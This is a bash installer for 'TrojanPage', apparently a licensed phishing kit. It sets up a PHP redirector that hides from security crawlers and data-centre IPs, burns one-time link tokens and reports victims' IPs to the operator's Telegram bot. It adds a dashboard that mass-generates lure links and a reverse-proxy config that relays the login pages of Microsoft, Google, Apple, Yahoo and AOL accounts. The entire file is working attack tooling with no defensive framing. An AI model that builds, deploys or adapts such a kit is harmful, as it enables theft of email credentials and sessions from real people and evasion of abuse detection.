#!/bin/bash
# 🏛️ TROJANPAGE - SECURE VALIDATED GHOST (V14.8.4)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. SYSTEM PREP ---
mkdir -p /root/db/
touch /root/db/used_tokens.txt
chmod 777 /root/db/used_tokens.txt

# --- 2. MASTER LICENSE CHECK ---
MASTER_KEY="TROJAN-PRO-2026"
show_header
echo -e "${YELLOW}»» SECURITY GATE: SYSTEM LOCK ACTIVE${NC}"
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED: INVALID LICENSE${NC}"; exit 1; }

# --- 3. TELEGRAM CREDENTIAL VALIDATION ---
echo -e "${GREEN}[+] License Verified. Proceeding to Credential Validation...${NC}"
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -e "${CYAN}[...] Pinging Telegram API...${NC}"
    CHECK_TOKEN=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
    if [[ $CHECK_TOKEN == *"\"ok\":true"* ]]; then
        BOT_NAME=$(echo $CHECK_TOKEN | grep -oP '(?<="first_name":")[^"]*')
        echo -e "${GREEN}[success] Handshake Successful: $BOT_NAME is Online.${NC}"
        break
    else
        echo -e "${RED}[error] Invalid Bot Token. Handshake Failed. Try again.${NC}"
    fi
done

read -p "Enter Telegram Chat ID: " TG_ID
read -p "Enter Cloudflare API Token: " CF_TOKEN
read -p "Enter Base Domain: " USER_DOMAIN
USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
read -p "Enter Path Slug: /" USER_SLUG
CLEAN_SLUG=$(echo "$USER_SLUG" | tr -dc 'a-zA-Z0-9')

# --- 4. THE SMART GATEKEEPER (ALL DOMAINS + TG ALERTS) ---
mkdir -p /var/www/adobe_gui/s
cat << EOF > /var/www/adobe_gui/s/index.php
<?php
\$botToken = "$TG_TOKEN";
\$chatId = "$TG_ID";
\$ip = \$_SERVER['REMOTE_ADDR'];
\$ua = strtolower(\$_SERVER['HTTP_USER_AGENT']);
\$token = \$_GET['t'];
\$target = \$_GET['id'];

// Bot Signature Filtering
\$bots = ['google','bot','crawler','spider','yandex','headless','lighthouse','python','curl','wget','zgrab','shodan'];
foreach (\$bots as \$bot) {
    if (strpos(\$ua, \$bot) !== false) {
        header("Location: https://www.google.com");
        exit();
    }
}

// Data Center Filtering
\$meta = json_decode(file_get_contents("http://ip-api.com/json/{\$ip}?fields=hosting,proxy,country"));
if (\$meta && (\$meta->hosting == true || \$meta->proxy == true)) {
    header("Location: https://www.microsoft.com");
    exit();
}

// Token Burn Logic
\$used_tokens = file("/root/db/used_tokens.txt", FILE_IGNORE_NEW_LINES);
if (in_array(\$token, \$used_tokens)) {
    header("Location: https://www.microsoft.com"); 
    exit();
}
file_put_contents("/root/db/used_tokens.txt", \$token . PHP_EOL, FILE_APPEND);

// TG Alert Logic
\$msg = "🔔 *Link Burned!* \n\n📍 *IP:* " . \$ip . " (" . (\$meta->country ?? 'Unknown') . ")\n🎯 *Target:* " . strtoupper(\$target) . "\n🔑 *Token:* " . \$token;
\$tg_url = "https://api.telegram.org/bot" . \$botToken . "/sendMessage?chat_id=" . \$chatId . "&text=" . urlencode(\$msg) . "&parse_mode=Markdown";
@file_get_contents(\$tg_url);

// Redirect logic
\$mask = \$_GET['m'];
\$domain = \$_SERVER['HTTP_HOST'];
\$slug = \$_GET['s'];
if(\$target && \$mask && \$slug) {
    header("Location: https://" . \$mask . "." . \$target . "." . \$domain . "/" . \$slug);
} else {
    header("Location: https://www.google.com");
}
exit();
?>
EOF

# --- 5. THE COMPLETE DASHBOARD ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

CONFIG="/root/config.json"
DOMAIN=$(grep -oP '(?<="proxyDomain": ")[^"]*' $CONFIG)
SLUG=$(echo "$USER_SLUG") 
MASK=$(tr -dc '0-9' < /dev/urandom | head -c 10)
TOKEN=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)

if [ -f /root/links_batch.txt ]; then
    TOTAL=$(wc -l < /root/links_batch.txt)
    BURNED=$(grep -Ff <(grep -oP 't=\K.*' /root/links_batch.txt) /root/db/used_tokens.txt | wc -l)
    LIVE=$((TOTAL - BURNED))
else
    TOTAL=0; BURNED=0; LIVE=0
fi

show_header
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}COMPLETE GHOST TERMINAL${NC} | ${PURPLE}ALERTS:${NC} ACTIVE | ${GREEN}STATUS: ONLINE${NC}     ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} 01 | Office365 | https://$DOMAIN/s/?id=office&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 02 | Outlook   | https://$DOMAIN/s/?id=outlook&m=$MASK&s=$SLUG&t=$TOKEN ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 03 | Gmail     | https://$DOMAIN/s/?id=gmail&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 04 | iCloud    | https://$DOMAIN/s/?id=icloud&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 05 | Yahoo     | https://$DOMAIN/s/?id=yahoo&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 06 | AOL       | https://$DOMAIN/s/?id=aol&m=$MASK&s=$SLUG&t=$TOKEN     ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC}  ${YELLOW}BATCH TRACKER:${NC} TOTAL: $TOTAL | ${RED}BURNED: $BURNED${NC} | ${GREEN}LIVE: $LIVE${NC}          ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC}  ${YELLOW}[B] NEW BATCH (50)${NC} | ${CYAN}[V] VIEW UNUSED LINKS${NC}                      ${BLUE}║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"

read -p "Selection (ID, B, V): " USER_SEL

if [[ "$USER_SEL" == "b" || "$USER_SEL" == "B" ]]; then
    read -p "Target (office, outlook, gmail, icloud, yahoo, aol): " B_TARGET
    > /root/links_batch.txt
    for i in {1..50}; do
        B_T=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8); B_M=$(tr -dc '0-9' < /dev/urandom | head -c 10)
        echo "https://$DOMAIN/s/?id=$B_TARGET&m=$B_M&s=$SLUG&t=$B_T" >> /root/links_batch.txt
    done
    echo -e "${GREEN}Batch Generated.${NC}"; sleep 1
elif [[ "$USER_SEL" == "v" || "$USER_SEL" == "V" ]]; then
    while read -r link; do
        T_VAL=$(echo "$link" | grep -oP 't=\K.*')
        if ! grep -q "$T_VAL" /root/db/used_tokens.txt; then echo -e "${CYAN}$link${NC}"; fi
    done < /root/links_batch.txt
    read -p "Press Enter..."
fi

sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 proxy
screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
cd /root/engine/dist/ && ./proxy -config "$CONFIG"
EOF

# --- 6. CONFIG GENERATION ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 8080,
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "proxyRules": [
    {"hostname": "*.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
    {"hostname": "*.gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
    {"hostname": "*.icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
    {"hostname": "*.yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
    {"hostname": "*.aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
  ]
}
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
echo -e "${GREEN}[success] Security Locks Restored. Type 'Run'.${NC}"
